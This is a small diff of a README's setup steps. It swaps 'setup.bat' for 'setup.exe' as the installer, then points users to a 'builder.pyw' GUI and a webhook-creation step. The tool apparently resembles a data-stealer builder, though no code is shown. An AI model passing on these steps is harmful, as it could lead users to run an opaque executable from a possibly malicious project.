@@ -79,10 +79,10 @@ Make sure you have Python installed 3.11+ and it is added to your path
 ```
 Once you've downloaded the files extract the folder so it's no longer a .zip file.
 ```
-### 3. Open The setup.bat File:
+### 3. Open The setup.exe File:
 
 ```
-You dont need to install any modules opening setup.bat will install them for you. Then you can open the builder.pyw file which will
+You dont need to install any modules opening setup.exe will install them for you. Then you can open the builder.pyw file which will
 open the gui.
 ```
 ### 4. Create A Webhook:
